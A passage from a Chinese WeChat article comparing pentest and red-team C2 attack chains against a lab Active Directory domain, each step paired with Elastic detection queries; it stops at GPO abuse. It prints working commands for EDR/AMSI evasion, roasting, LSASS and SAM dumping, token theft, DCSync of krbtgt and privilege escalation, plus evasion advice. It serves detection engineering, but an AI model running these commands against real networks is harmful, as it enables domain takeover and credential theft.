---
title: 【微信】红队 vs 渗透测试：Active Directory 攻击工作流
source: https://mp.weixin.qq.com/s/1dPLy-rh_bx7uTqB-XiaLg
source_host: mp.weixin.qq.com
clip_date: 2026-11-07T13:27:25+08:00
trace_id: 70d1021c-5b18-4e8e-b060-e0d8c6b422e5
content_hash: 782fe49307a341a2bcc1b6a639f02e59b72fa30faf899aebdf8ba6b58cd7733c
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 41175244-d011-81cb-8397-cfa774b856e9
ioc: null
---

**网安之家-CyberHomestead** *2026年11月6日 22:11*

> **同一条攻击链，打了两次。** 一次从 Kali 打进来，一次从域内机器打进来。 结局一样——域控沦陷。 但你的 SIEM 只抓到了 4 条告警。

* * *

## 📌 导读：这篇文章到底讲了什么

同样一套 AD 攻击链，在同一个实验环境里跑了两遍：一遍是传统渗透测试（从 Kali 机器外部打），一遍是红队 C2（从已经拿下的一台域成员服务器内部打）。 **两条路径都完成了从域成员服务器 → 子域 DC → 父域 DC 的完整域接管。**

但检测结果 **天差地别**。

本文逐节对照每一条攻击技术的 **渗透测试命令、C2 等价命令、OPSEC（行动安全）差异、以及对应的 Elastic 检测查询**。技术、检测查询与 OPSEC 分析适用于任意 Active Directory 环境。 **GOAD-Light 只是演示用的靶场，不是本文的主题。**

> 全文所有 C2 命令均在一个活跃的 **Adaptix C2 Kharon agent** 会话中执行。 所有 Elastic 查询均在 Kibana Discover 或 KQL 输入栏中执行。
> 
> 引用的 Extension-Kit BOF 模块： `AD-BOF` 、 `Creds-BOF` 、 `Elevation-BOF` 、 `Execution-BOF` 、 `Injection-BOF` 、 `LateralMovement-BOF` 、 `SAL-BOF` 、 `SAR-BOF` 、 `Process-BOF` 、 `Postex-BOF` 、 `Kerbeus-BOF`

* * *

## 🌳 项目成果树 / 全文章节索引

```sql
AD-ATTACK-WORKFLOW/
│
├── 【实验环境】Lab Environment
│   ├── 靶场：GOAD-Light（多域 AD + 故意配置缺陷）
│   ├── SIEM/EDR：Elastic Security（10.1.20.2）
│   └── C2：Adaptix（10.1.10.50, LXC）+ Kharon agent
│
├── 01 - 初始立足点 (Initial Foothold)
│   ├── 1.1 起点：castelblack 上的 samwell.tarly（低权限）
│   └── 1.2 Agent 配置降噪（sleep/jitter/blockdlls/mask/amsi/syscall/spawnto）
│
├── 02 - 侦察 (Reconnaissance)
│   ├── 2.1 主机发现        nmap -sn        → smartscan BOF
│   ├── 2.2 SMB 用户枚举   nxc --users     → ldapsearch BOF
│   ├── 2.3 共享枚举       nxc --shares    → SOCKS+nxc / net view
│   └── 2.4 BloodHound 采集 bloodhound-python → SharpHound / ldapsearch BOF
│
├── 03 - 凭据访问 (Credential Access)
│   ├── 3.1 AS-REP Roasting   GetNPUsers  → kerbeus asreproasting
│   ├── 3.2 Kerberoasting     GetUserSPNs → kerbeus asktgt + kerberoasting
│   ├── 3.3 LSASS 凭据转储    mimikatz    → nanodump / hashdump / lsadump
│   └── 3.4 DCSync            secretsdump  → dcsync single / lsadump_secrets
│
├── 04 - 权限提升 (Privilege Escalation)
│   ├── 4.1 GPO 滥用          pygpoabuse   → pygpoabuse over SOCKS
│   └── 4.2 本地提权到 SYSTEM  evil-winrm  → getsystem token / potato
│
├── 05 - SQL Server 漏洞利用
│   ├── 5.1 实例发现    nxc mssql       → mssql 1434udp BOF
│   ├── 5.2 服务器信息  mssqlclient.py  → SQLRecon execute-assembly
│   ├── 5.3 当前用户上下文
│   ├── 5.4 模拟枚举    EXECUTE AS LOGIN 链
│   ├── 5.5 数据库与用户枚举 (as sa)
│   ├── 5.6 链接服务器枚举 (as sa)
│   └── 5.7 xp_cmdshell 执行系统命令 (as sa)
│
├── 06 - 横向移动 (Lateral Movement)
│   ├── 6.1 WinRM        evil-winrm → invoke winrm BOF
│   ├── 6.2 PsExec       impacket-psexec → jump psexec BOF / SMB link
│   ├── 6.3 SCShell      smbexec.py → jump scshell BOF（免 7045）
│   └── 6.4 RDP          xfreerdp 直接 → xfreerdp over SOCKS
│
├── 07 - 域提权 (Domain Escalation)
│   ├── 7.1 受限委派滥用  findDelegation → kerbeus s4u (S4U2Self+S4U2Proxy)
│   └── 7.2 ExtraSids / 黄金票据  raiseChild.py → Rubeus golden + kerbeus ptt
│
├── 08 - 后渗透 (Post-Exploitation)
│   ├── 8.1 文件操作       smbclient get → fs ls / fs cat / download
│   ├── 8.2 NETLOGON 脚本发现 smbclient NETLOGON → fs cat
│   └── 8.3 态势感知       whoami/ipconfig/net → SAL-BOF（零子进程）
│
├── 09 - Shellcode 注入（新信标部署）
│   ├── 9.1 CreateRemoteThread  scinject
│   └── 9.2 Extension-Kit 注入 BOF  inject-sec / inject-cfg / inject-poolparty
│
├── 10 - 检测覆盖度总结 (Detection Coverage Summary)
│   ├── 10.1 各攻击阶段命中的预置规则表
│   ├── 10.2 检测盲区（无预置规则触发）清单
│   └── 10.3 补齐盲区的 5 条自定义规则
│
├── 11 - 完整攻击链映射 (Full Attack Chain Mapping)
│   ├── 11.1 路径 A（20 步完整表）
│   └── 11.2 路径 B（20 步完整表）
│
├── 附录 A - Extension-Kit BOF 速查表
│   ├── AD-BOF / Kerbeus-BOF / Creds-BOF / Execution-BOF
│   ├── Injection-BOF / LateralMovement-BOF / Elevation-BOF
│   └── SAL-BOF / SAR-BOF / Kharon 内置命令
│
├── 附录 B - Elastic 索引模式对照表
└── 附录 C - Sysmon Event ID 速查表
│
└── 【核心结论】Key Findings
    ├── 预置规则触发数：渗透 12+  vs  红队 4
    ├── 零检测技术数：  渗透 2   vs  红队 10
    ├── LSASS 相关告警： 渗透 5+  vs  红队 0
    └── 真正的缺口不是遥测，是规则覆盖度
```

* * *

## 🎯 关键指标速览（先看结论，再看过程）

| 指标  | 渗透测试（来自 Kali） | 红队 C2（来自域内主机） |
| --- | --- | --- |
| 触发的 Elastic 预置规则数 | **12+** | **4** |
| 完全零检测的技术数量 | **2**<br><br>（AS-REP Roasting、Kerberoasting） | **10**<br><br>（见第 10.2 节） |
| LSASS 相关告警 | **5+**<br><br>条规则 | **0**<br><br>（改用 SAM 方案，全程未碰 lsass.exe） |
| 进程创建事件（Event ID 1） | 频繁（cmd、net、whoami） | **接近于零**<br><br>（BOF 全程进程内执行） |
| 源 IP 异常特征 | 外部 IP 极其扎眼 | 域成员服务器 IP，与正常流量混同 |

* * *

## 1 - 初始立足点（Initial Foothold）

### 1.1 - 起点（Starting Point）

这套工作流从一个以 `samwell.tarly` 身份运行在 castelblack（SRV02，10.1.10.22）上的 Kharon agent 开始。

活跃 agent 状态：

| 字段  | 值   |
| --- | --- |
| 主机  | castelblack (SRV02) |
| IP  | 10.1.10.22 |
| 用户  | NORTH\\samwell.tarly |
| 权限  | 低（普通域用户，无本地管理员） |
| Agent | Kharon HTTP |

`samwell.tarly` 是一个没有任何本地管理员权限的普通域用户。 **所有的侦察、凭据获取、权限提升和横向移动都从这个低权限立足点开始。** 整个行动从工作站一路打到域控制器，靠的是权限提升与横向移动。

### 1.2 - Agent 配置（Agent Configuration）

**MITRE ATT&CK**：T1562.001（削弱防御：禁用或修改工具）、T1027（混淆文件或信息）、T1134.004（父进程 ID 欺骗）、T1036.005（伪装：匹配合法名称或位置）、T1106（原生 API）

agent 上线之后，先把配置调低以减少暴露面。在 castelblack 的 agent 会话中执行以下命令。

**C2 命令（在 castelblack agent 上执行，每个新 agent 上线时重复一遍）：**

```lua
config sleep 5000
config jitter 30
config ppid 0
config blockdlls true
config mask.beacon timer
config mask.heap true
config amsi_etw_bypass all
config syscall spoof_indirect
config bof_api_proxy true
config spawnto C:\Windows\System32\RuntimeBroker.exe
```

| 设置项 | 作用  |
| --- | --- |
| `sleep 5000`<br><br>/ `jitter 30` | 回连间隔设为 5 秒，带 30% 随机性。信标间隔实际在 3500ms–6500ms 之间浮动。 |
| `blockdlls true` | 阻止非微软签名的 DLL 在派生的子进程中加载。这会让 EDR 的注入钩子失效。 |
| `mask.beacon timer` | 睡眠期间加密信标内存区域。使用定时器队列回调配合 ROP 链，把内存翻转为 RW，加密，睡眠，解密，再翻回 RX。 |
| `mask.heap true` | 睡眠期间加密堆内存分配。防止内存扫描器找到字符串和配置数据。 |
| `amsi_etw_bypass all` | 在 `execute-assembly` 或 `dotnet` 命令执行前对 AMSI 与 ETW 打补丁。阻止.NET 遥测触达 Defender 与 Elastic。 |
| `syscall spoof_indirect` | 使用带栈欺骗的间接系统调用。所有 `Nt*` API 调用都通过 ntdll.dll 指令地址发起，并伪造调用栈。 |
| `bof_api_proxy true` | 将 BOF 的 API 调用路由到信标内部代理。这样 BOF 模块同样享有栈欺骗和间接系统调用的能力。 |
| `spawnto RuntimeBroker.exe` | 将 fork-and-run 操作的牺牲进程设为 `RuntimeBroker.exe` 。这是一个在用户会话中经常运行的合法 Windows 进程。 |

**Elastic 查询 - 检测信标睡眠混淆：**

无直接检测手段。睡眠混淆属于内存内技术。最佳检测方式是借助 Elastic Defend 行为告警进行内存扫描：

```
event.module:"endpoint" AND event.action:"Memory Threat Detection Alert"
```

* * *

## 2 - 侦察（从 castelblack 立足点出发）

本节所有枚举都在 castelblack（SRV02）上的低权限 `samwell.tarly` agent 中执行。 **这正是与渗透测试路线的关键差异：不是从外部 Kali 主机扫描，而是每一条查询都从一台已加入域的成员服务器发起。** 这些流量与正常的 Active Directory 运维流量混同。这些操作 **不需要任何本地管理员权限**。

### 2.1 - 主机发现（Host Discovery）

**MITRE ATT&CK**：T1046（网络服务发现）

**渗透测试命令（来自 Kali）：**

```
nmap -sn -n -v 10.1.10.0/24
```

**C2 命令（来自 castelblack agent）：**

```
smartscan 10.1.10.0/24 -p standart
```

这会运行 SAR-BOF 的 smartscan 模块。它是一个单线程的静默端口扫描器。 `-p standart` 模式（注意拼写错误是 BOF 源码里就有的）会扫描约 20 个端口，包括 135、139、445、3389、5985、5986、22、21、25、53。想更窄地扫描，直接指定端口：

```
smartscan 10.1.10.0/24 -p 445
```

**OPSEC 对比：**

| 因素  | 渗透测试（nmap） | 红队（smartscan BOF） |
| --- | --- | --- |
| 流量来源 | 外部（Kali IP） | 内部（SRV02 IP） |
| 协议  | ICMP echo | TCP connect |
| 流量量级 | 256 台主机 × 全部端口 | 256 台主机 × 指定端口 |
| 特征  | nmap user-agent / TTL 异常 | 来自域内主机的一次正常 TCP 连接 |

**Elastic 查询 - 检测内网端口扫描：**

预置规则：

```
rule.name:"Potential Network Scan Executed From Host"
```

自定义高连接量查询（单一源）：

```
event.category:"network" AND destination.port:445 AND source.ip:"10.1.10.22"
```

> smartscan 的输出表明它其实 **相对嘈杂**。一个更安静的替代方案：列出 castelblack 的 ARP 表来发现邻居，无需产生网络扫描遥测。
> 
> 这样可以完全避免 smartscan 产生的检测信号与遥测。

### 2.2 - SMB 用户枚举（SMB User Enumeration）

**MITRE ATT&CK**：T1087.002（账户发现：域账户）

**渗透测试命令（来自 Kali）：**

```
# 允许匿名认证
nxc smb 10.1.10.11 --users
```

**C2 命令（来自 castelblack agent）：**

以 `samwell.tarly` 身份执行定向的 ldapsearch 查询：

```
ldapsearch (objectClass=user) -a sAMAccountName,description,memberOf,lastLogon
```

这会运行 AD-BOF 的 ldapsearch 模块。 **它使用信标当前的令牌上下文发送 LDAP 查询。** 来自域内机器的 LDAP 查询是标准的 Active Directory 流量。

完整语法参考：

```css
ldapsearch <query> [-a attributes] [-c count] [-s scope] [--dc dc] [--dn dn] [--ldaps]
```

**OPSEC 对比：**

| 因素  | 渗透测试（nxc --users） | 红队（ldapsearch BOF） |
| --- | --- | --- |
| 协议  | SMB + SAMR RPC | LDAP（389 端口） |
| 认证  | 明文凭据上线 | 当前 Kerberos 令牌 |
| 可见性 | SAMR 枚举被记录 | 标准 LDAP 查询，正常 AD 流量 |
| Sysmon 覆盖 | 针对 samr 的命名管道事件（Event ID 17/18） | LDAP 无 Sysmon 事件 |

**Elastic 查询 - 检测 LDAP 枚举：**

预置规则 —— 该预置规则 **只在访问敏感属性** （userPassword、unicodePwd、msDS-ManagedPassword）时触发。 `sAMAccountName` 、 `memberOf` 这类标准侦察属性 **不会触发**：

```
rule.name:"Suspicious Access to LDAP Attributes"
```

尝试通过 Sysmon Event ID 3（网络连接）检测。该查询查找对 389 端口发起 LDAP 连接的非标准进程。像 `RuntimeBroker.exe` 、 `notepad.exe` 或其他非 AD 二进制去连 LDAP 就属于异常：

```javascript
event.code:"3" AND destination.port:389 AND NOT process.name:("lsass.exe" OR "dns.exe" OR "Microsoft.ActiveDirectory.WebServices.exe" OR "svchost.exe" OR "mmc.exe" OR "dsac.exe" OR "ServerManager.exe")
```

也可以尝试按源 IP 过滤：

```
event.code:"3" AND destination.port:389 AND source.ip:"10.1.10.22"
```

**结果：两种查询均无任何命中。**

ldapsearch BOF **完全内联运行在信标进程内**。它不派生任何子进程，也不会创建 Sysmon 会独立记录的新网络连接。

LDAP 调用在信标自己的线程中执行，并使用进程令牌。连接继承信标宿主进程的上下文。 **如果信标活在 `rundll32.exe` 或 `svchost.exe` 里，进程名本来就已在排除列表中。**

即便进程名不正常，Sysmon Event ID 3 对这次内联 BOF 执行 **根本没有触发**。这证实了： **进程内 BOF 的 LDAP 查询在源主机上产生零 Sysmon 网络遥测。**

检测必须在 **域控侧** 开启 LDAP 查询审计（Event ID 1644），而这 **默认是不开启的**。要开启，需要在每台 DC 上设置以下注册表项：

```
HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics\15 Field Engineering = 5 (DWORD)
```

通过 Proxmox 在两台 DC 上开启：

```sql
# DC02 (winterfell, VMID 111)
ssh root@192.168.1.100 "qm guest exec 111 -- powershell.exe -Command 'Set-ItemProperty -Path \"HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics\" -Name \"15 Field Engineering\" -Value 5'"

# DC01 (kingslanding, VMID 110)
ssh root@192.168.1.100 "qm guest exec 110 -- powershell.exe -Command 'Set-ItemProperty -Path \"HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics\" -Name \"15 Field Engineering\" -Value 5'"
```

没有这个注册表项，DC 不会记录 LDAP 查询。 **任何关于内联 BOF LDAP 活动的检测结论，只有在开启该设置之后才成立。**

开启后，在 Elastic 中查询 Event ID 1644：

```
event.code:"1644"
```

按源主机过滤以隔离出信标的活动：

```
event.code:"1644" AND winlog.event_data.SearchFilter:*objectClass*
```

按侦察阶段用到的具体 LDAP 过滤字符串过滤：

```ruby
event.code:"1644" AND (winlog.event_data.SearchFilter:*sAMAccountName* OR winlog.event_data.SearchFilter:*servicePrincipalName* OR winlog.event_data.SearchFilter:*userAccountControl*)
```

### 2.3 - 共享枚举（Share Enumeration）

**MITRE ATT&CK**：T1135（网络共享发现）

**渗透测试命令（来自 Kali）：**

```
nxc smb 10.1.10.22 -u samwell.tarly -p Heartsbane --shares

smbclient -U "samwell.tarly" //10.1.10.22/all
```

**C2 命令（来自 castelblack agent）：**

如果尚未模拟身份，先为 `samwell.tarly` 制作令牌：

```
token make -d north.sevenkingdoms.local -u samwell.tarly -p Heartsbane
```

**方式 A —— SOCKS + nxc / cmd net view：**

随后启用 SOCKS 代理，并在 Kali 上使用 proxychains：

```
socks start 1080
```

从 Kali（在 Kali 终端中执行）：

```
proxychains -q nxc smb 10.1.10.22 -u samwell.tarly -p Heartsbane --shares
```

或者使用 process create 配合 net view（不需要 SOCKS，但会创建子进程，并会触发 Elastic 预置规则 "Svchost spawning cmd"）：

```
process create --command "cmd.exe /c net view \\10.1.10.22 /all" --pipe true
```

Extension-Kit 中 **没有专门的"共享枚举"BOF**。 **首选 SOCKS 代理方式，因为它不在信标主机上创建子进程。**

如果必须使用 process create，请伪造子进程的 PPID 以规避检测。流程如下：

在进程列表中搜索一个合适的父进程。 `svchost` 是个不错的选择。

像 `msedge` 这样的进程当父进程会引起怀疑。 **没有任何合法理由让 msedge 去派生 cmd.exe。**

```
help config ppid
config ppid 716
```

随后执行 process create（由于 Kharon agent 的一个 bug，该命令返回为空输出，你可以替换成任何能达成同样效果的命令）：

```
process create --command "cmd.exe /c net view \\10.1.10.22 /all" --pipe true
```

**方式 B —— 使用内置命令：**

```
fs ls \\10.1.10.22\all
fs cat \\10.1.10.22\all\arya.txt
```

> arya.stark 留下了一条暗指名为 Needle 的剑的纸条。

**OPSEC 对比：**

| 因素  | 渗透测试（nxc/smbclient） | SOCKS + nxc / cmd net view | 使用内置命令 |
| --- | --- | --- | --- |
| 流量来源 | 外部 Kali IP | 内部 SRV02 IP | 内部 SRV02 IP |
| 认证  | NTLM（密码上线） | Kerberos（经模拟令牌）或经 SOCKS 的 NTLM | 模拟令牌 |
| 目标上的进程痕迹 | 无   | 使用 process create 时有 cmd.exe 子进程 | 无   |

**Elastic 查询 - 检测共享枚举：**

预置规则：

```
rule.name:"Windows Network Enumeration"
rule.name:"Svchost spawning cmd"
```

KQL 查询 —— 针对 net view 进程创建：

```
event.code:"1" AND process.name:"net.exe" AND process.command_line:*view*
```

**父进程欺骗无济于事**，因为命令行参数本身就很可疑。态势感知套件中的 netshare BOF 可以完全规避这项检测。 **然而 netshare 并不在我们这套 Adaptix Extension-Kit 中。** 使用内置命令同样能规避该检测，但它需要事先知道确切的共享名。

### 2.4 - BloodHound 采集（BloodHound Collection）

**MITRE ATT&CK**：T1087.002（账户发现：域账户）、T1069.002（权限组发现：域组）、T1482（域信任发现）

**渗透测试命令（来自 Kali）：**

```
bloodhound-python -d north.sevenkingdoms.local -u 'samwell.tarly' -p 'Heartsbane' -dc winterfell.north.sevenkingdoms.local -ns 10.1.10.11 -c ALL
```

**C2 命令（来自 castelblack agent）：**

**方式 A —— 内存内 SharpHound 通过 execute-assembly 执行（OPSEC 很差）**：它确实是内联执行，但它会把.NET CLR 加载进 agent 进程。 **CLR 在执行后无法卸载，防守方可以在该进程剩余的生命周期内持续检测到它的存在。**

```css
execute-assembly /path/to/SharpHound.exe -c Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs --Throttle 3000 --Jitter 50
```

**方式 B —— 基于 BOF 的 ldapsearch 枚举（特征更低）：**

```
# 用户枚举
ldapsearch (objectClass=user) -a sAMAccountName,memberOf,servicePrincipalName,msDS-AllowedToDelegateTo,userAccountControl
# 计算机枚举
ldapsearch (objectClass=computer) -a sAMAccountName,operatingSystem,dNSHostName,msDS-AllowedToActOnBehalfOfOtherIdentity
# 组枚举
ldapsearch (objectClass=group) -a sAMAccountName,member
```

完整 ldapsearch 语法：

```
ldapsearch <query> [-a attributes] [--dc dc] [--dn dn]
```

输出中的有意思的发现：

> `jon.snow` 对 `CIFS/winterfell` 拥有受约束委派权限
> 
> `sql_svc` 上设置了 SPN

**OPSEC 对比：**

| 因素  | 渗透测试（bloodhound-python） | 红队方式 A（SharpHound） | 红队方式 B（ldapsearch BOF） |
| --- | --- | --- | --- |
| 协议  | 来自 Kali 的 LDAP | 来自信标进程的 LDAP | 来自信标进程的 LDAP（内联 BOF） |
| 磁盘痕迹 | 无   | 无（内存内） | 无（BOF，未加载 CLR） |
| 检测  | LDAP 量级飙升 | LDAP 量级 +.NET 程序集加载（CLR 留在进程内） | 标准 LDAP 查询，源主机上无 Sysmon Event ID 3 遥测（见第 2.2 节） |
| AMSI | 不适用 | 通过 amsi_etw_bypass all 绕过 | 不适用（原生 C BOF，不涉及 CLR） |
| 子进程 | 无   | 无（内联） | 无（内联） |

**Elastic 查询 - 检测 SharpHound（方式 A）：**

预置规则：

```
rule.name:"Enumeration of Privileged Local Groups Membership"
rule.name:"Suspicious Access to LDAP Attributes"
```

**Elastic 查询 - 检测 ldapsearch BOF（方式 B）：**

无预置规则触发。内联 BOF 在源主机上产生零 Sysmon 网络遥测（完整分析见第 2.2 节）。 **检测依赖 DC 侧的 LDAP 查询审计（Event ID 1644）。**

* * *

## 3 - 凭据访问（Credential Access）

### 3.1 - AS-REP Roasting

**MITRE ATT&CK**：T1558.004（窃取或伪造 Kerberos 票据：AS-REP Roasting）

**渗透测试命令（来自 Kali）：**

```
impacket-GetNPUsers -dc-ip 10.1.10.11 north.sevenkingdoms.local/samwell.tarly:'Heartsbane'
```

**C2 命令（来自 castelblack agent）：**

```
# 先枚举可被 asreproast 的用户
ldapsearch "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

# 然后对该用户执行 asreproast
kerbeus asreproasting /user:brandon.stark /domain:north.sevenkingdoms.local
```

完整语法：

```
kerbeus asreproasting /user:USER [/dc:DC] [/domain:DOMAIN]
```

kerbeus BOF 会发送一个带 `DONT_REQ_PREAUTH` 的 Kerberos AS-REQ。DC 返回 AS-REP，其中包含可离线破解的加密部分。

**OPSEC 对比：**

| 因素  | 渗透测试（GetNPUsers） | 红队（kerbeus BOF） |
| --- | --- | --- |
| 流量来源 | 外部 Kali IP | 内部 SRV02 IP |
| 协议  | Kerberos AS-REQ | Kerberos AS-REQ |
| 目标上的进程痕迹 | 无   | 无（BOF 运行在信标内存中） |
| 检测  | 相同的 Kerberos 事件 | 相同的 Kerberos 事件 |

两种方法都会在 DC 上产生相同的 **Event ID 4768（TGT 请求）**。 **唯一的差别是源 IP。**

**Elastic 查询 - 检测 AS-REP Roasting：**

```
event.code:"4768" AND winlog.event_data.PreAuthType:"0"
```

**当前 152 条规则集中没有任何 Elastic 预置规则会在 AS-REP roasting 上触发。这需要一条自定义规则。**

### 3.2 - Kerberoasting

**MITRE ATT&CK**：T1558.003（窃取或伪造 Kerberos 票据：Kerberoasting）

**渗透测试命令（来自 Kali）：**

```
impacket-GetUserSPNs -dc-ip 10.1.10.11 north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -request
```

**C2 命令（来自 castelblack agent）：**

第 1 步 —— 枚举带 SPN 的账户：

```
ldapsearch (servicePrincipalName=*) -a sAMAccountName,servicePrincipalName,pwdLastSet,lastLogon
```

第 2 步 —— 请求 TGT（作为 kerberoasting 的输入）：

```
kerbeus asktgt /user:samwell.tarly /password:Heartsbane /domain:north.sevenkingdoms.local /enctype:aes256 /opsec
```

第 3 步 —— 用 TGT 请求目标 SPN 的 TGS。 **一次只请求一个 SPN（OPSEC：不要一次性喷洒所有 SPN）**：

```
kerbeus kerberoasting /spn:CIFS/winterfell.north.sevenkingdoms.local /ticket:<base64_tgt_from_step2>
```

完整语法：

```bash
kerbeus kerberoasting /spn:SPN /ticket:BASE64 [/dc:DC] [/domain:DOMAIN]
kerbeus kerberoasting /spn:SPN /nopreauth:USER [/dc:DC] [/domain:DOMAIN]
```

第 4 步 —— 在 Kali 上离线破解 TGS 哈希：

```
hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
```

**OPSEC 对比：**

| 因素  | 渗透测试（GetUserSPNs -request） | 红队（kerbeus kerberoasting） |
| --- | --- | --- |
| 量级  | 一次性请求所有 SPN 账户 | 单一目标 SPN |
| 加密  | 默认 RC4（0x17） | 取决于目标账户，使用该账户支持的 enctype |
| 来源  | 外部 IP | 内部域主机 |
| 检测  | 短时间内连续多个 4769 事件 | 单个 4769 事件，流量形态正常 |

**Elastic 查询 - 检测 Kerberoasting：**

```
event.code:"4769" AND winlog.event_data.TicketEncryptionType:"0x17" AND NOT winlog.event_data.ServiceName:*$
```

这条查询检测针对用户账户（而非机器账户）的 RC4 TGS 请求。 **没有预置的 Elastic 规则覆盖此项，需要自定义规则。**

### 3.3 - LSASS 凭据转储（mimikatz / sekurlsa::logonpasswords）

**MITRE ATT&CK**：T1003.001（OS 凭据转储：LSASS 内存）、T1003.002（安全账户管理器）、T1003.004（LSA Secret）、T1003.005（缓存的域凭据）

> 在以 `jon.snow` 身份从 NETLOGON 共享访问到的 `secret.ps1` 中发现 `jeor.mormont` 的密码之后。

**渗透测试命令（来自 castelblack，经 RDP）：**

```
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**C2 命令（来自 castelblack agent）：**

**方式 A —— nanodump BOF（需要 SYSTEM，会碰 LSASS，OPSEC 很差）：**

```
nanodump -sc --valid -w C:\Windows\Temp\debug.log
```

完整 nanodump 语法：

```css
nanodump [-w DUMP_PATH] [--valid] [-d] [-de] [-sc] [--fork] [--snapshot] [-eh] [--getpid] [--pid PID]
```

| 标志  | 作用  |
| --- | --- |
| `-sc` | 使用伪造调用栈打开 LSASS 句柄。规避检查 CallTrace 字段的 Sysmon Event 10 ProcessAccess 规则。 |
| `--valid` | 生成带有合法 MiniDump 签名的转储。用 pypykatz 解析时必需。 |
| `-w` | 把转储写入指定文件路径。 |
| `--fork` | 转储前 fork 出 LSASS 进程。减少 LSASS 句柄被持有的时间。 |
| `--snapshot` | 转储前对 LSASS 进程做快照。 |

随后下载并离线解析：

```
download C:\Windows\Temp\debug.log
```

在 Kali 上：

```
pypykatz lsa minidump debug.log
```

清理转储文件：

```
fs rm C:\Windows\Temp\debug.log
```

**方式 B —— hashdump BOF（推荐，以 `jeor.mormont` 身份运行，SAM hive，仅本地账户）：**

```
hashdump
```

**方式 C —— 以 SYSTEM 身份运行的 lsadump BOF：**

它从本地注册表读取 secret， **完全不碰 LSASS**。

```
lsadump_secrets
lsadump_cache
```

**OPSEC 对比：**

| 因素  | 渗透测试（磁盘上的 mimikatz） | 红队方式 A（nanodump -sc BOF） | 红队方式 B（hashdump BOF，推荐） |
| --- | --- | --- | --- |
| 磁盘痕迹 | 磁盘上的 mimikatz.exe | Minidump 文件（下载后删除） | 无   |
| 进程访问 | 对 lsass.exe 执行 OpenProcess | 伪造调用栈，间接句柄复制 | 注册表 hive 读取 |
| Sysmon Event 10 | 存在（对 lsass 的 ProcessAccess） | 减少：伪造调用栈可规避 CallTrace 检查 | 无（基于注册表） |
| 触发的 Elastic 规则 | 多条：LSASS Memory Dump、Mimikatz Memssp 等 | 可能触发：Suspicious Lsass Process Access | Credential Acquisition via Registry Hive Dumping |

**Elastic 查询 - 检测凭据转储：**

预置规则 —— 任何 LSASS 访问：

```
rule.name:"LSASS Memory Dump Handle Access" OR rule.name:"LSASS Memory Dump Creation" OR rule.name:"Suspicious Lsass Process Access" OR rule.name:"LSASS Process Access via Windows API"
```

预置规则 —— 针对 mimikatz 本身：

```
rule.name:"Potential Invoke-Mimikatz PowerShell Script" OR rule.name:"Mimikatz Memssp Log File Detected"
```

预置规则 —— 针对 SAM/注册表凭据访问：

```
rule.name:"Credential Acquisition via Registry Hive Dumping"
```

针对 lsass 的 Sysmon Event 10（ProcessAccess）：

```
event.code:"10" AND winlog.event_data.TargetImage:*lsass.exe*
```

**实际只运行了方式 B（推荐）。没有产生任何 LSASS 访问事件。这证实了 SAM 方案相对触碰 lsass.exe 的优势。**

SAM 转储只返回了本地 Administrator 的哈希。 **要在不碰 LSASS 的前提下拿到域凭据，就窃取 castelblack 上以 `robb.stark` （Domain Admin）身份运行的进程的令牌。**

```
token steal 3852
token list
token impersonate 1
```

### 3.4 - DCSync

**MITRE ATT&CK**：T1003.006（OS 凭据转储：DCSync）

**渗透测试命令（来自 Kali）：**

```
secretsdump.py north.sevenkingdoms.local/robb.stark:sexywolfy@10.1.10.11
```

或 ExtraSids 变体：

```
raiseChild.py -target-exec 10.1.10.10 north.sevenkingdoms.local/samwell.tarly:Heartsbane
```

**C2 命令（来自 castelblack agent）：**

```
token make -u robb.stark -p sexywolfy -d north.sevenkingdoms.local
token list
token impersonate 7979
# 确认访问
kerbeus klist
```

Extension-Kit 中在 AD-BOF 下包含一个 DCSync BOF。使用 `dcsync` 命令：

针对单个账户并显式指定 DC（**比 dcsync all 安静得多**）：

```
dcsync single krbtgt -dc winterfell.north.sevenkingdoms.local
dcsync single arya.stark -dc winterfell.north.sevenkingdoms.local
dcsync single sansa.stark -dc winterfell.north.sevenkingdoms.local
```

对所有域用户（**非常吵，不推荐**）：

```
dcsync all --only-nt --only-users
```

完整语法：

```css
dcsync single <target> [-ou OU] [-dc DC] [--ldaps] [--only-nt]
dcsync all [-ou OU] [-dc DC] [--ldaps] [--only-nt] [--only-users]
```

**当你在 DC 上已有 SYSTEM 时，首选替代方案：在 DC 上使用 lsadump_secrets。它从本地注册表读取 secret，不产生任何 DCSync 复制流量。**

```
lsadump_secrets
```

**OPSEC 警告：DCSync 会产生多个 Event ID 4662（目录服务访问）条目，并带有复制相关的 GUID。这属于被重点监控的行为。在 DC 上有 SYSTEM 访问权限时，请优先使用 lsadump_secrets。**

**Elastic 查询 - 检测 DCSync：**

预置规则：

```
rule.name:"Interactive Logon by an Unusual Process"
rule.name:"Potential Credential Access via DCSync" OR rule.name:"FirstTime Seen Account Performing DCSync"
```

**即使只针对单个账户做定向 DCSync， `Potential Credential Access via DCSync` 规则依然触发了。**

自定义 Sysmon/Windows Security 查询：

```
event.code:"4662" AND winlog.event_data.Properties:*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*
```

GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` 对应 **DS-Replication-Get-Changes**。

* * *

## 4 - 权限提升（Privilege Escalation）

### 4.1 - GPO 滥用（samwell.tarly 对 STARKWALLPAPER 的 GenericWrite）

**MITRE ATT&CK**：T1484.001（域或租户策略修改：组策略修改）

**渗透测试命令（来自 Kali）：**

```
python3 pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' \
  -gpo-id "02069b0e-d6c4-49e9-bea3-68adf6b109a6" \
  -command 'net localgroup administrators samwell.tarly /add' \
  -taskname 'Update' -f
```

**C2 命令（来自 castelblack agent）：**

